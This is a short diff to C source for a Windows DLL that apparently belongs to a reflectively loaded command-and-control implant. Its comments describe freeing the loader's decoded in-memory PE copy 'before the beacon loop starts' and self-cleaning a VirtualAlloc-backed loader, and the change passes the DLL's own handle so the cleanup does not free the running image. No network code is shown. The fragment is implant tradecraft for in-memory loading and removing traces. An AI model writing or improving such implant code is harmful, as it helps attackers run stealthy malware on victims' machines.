@@ -36,7 +36,7 @@ static void settings_init_once(HINSTANCE hinstDLL) {
  * stack and passes it as the reason-4 parameter) */
 typedef struct { DWORD magic; void *alloc; } BW_HANDOFF;
 
-static void container_release(LPVOID lpReserved) {
+static void container_release(LPVOID lpReserved, HINSTANCE hinstDLL) {
 	BW_HANDOFF *ho = (BW_HANDOFF *)lpReserved;
 	MEMORY_BASIC_INFORMATION mbi;
 	unsigned char *img, *img_end;
@@ -53,7 +53,7 @@ static void container_release(LPVOID lpReserved) {
 	if (mbi.State != MEM_COMMIT || mbi.Type != MEM_PRIVATE)
 		return;
 	/* never free anything overlapping the image we are running from */
-	img = (unsigned char *)hAppInstance;
+	img = (unsigned char *)hinstDLL;
 	img_end = NULL;
 	if (img != NULL) {
 		DWORD lfanew = *(DWORD *)(img + 0x3C);
@@ -94,7 +94,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 
 			/* P4: drop the container's decode buffer (full PE copy of us)
 			   before the beacon loop starts - see container_release() */
-			container_release(lpReserved);
+			container_release(lpReserved, hinstDLL);
 
 			/* clean up our loader（legacy 非映像加载路径：CLEANUP=1 且镜像为
 			   VirtualAlloc 私有内存时释放自身；映像-backed 路径 CLEANUP=0） */
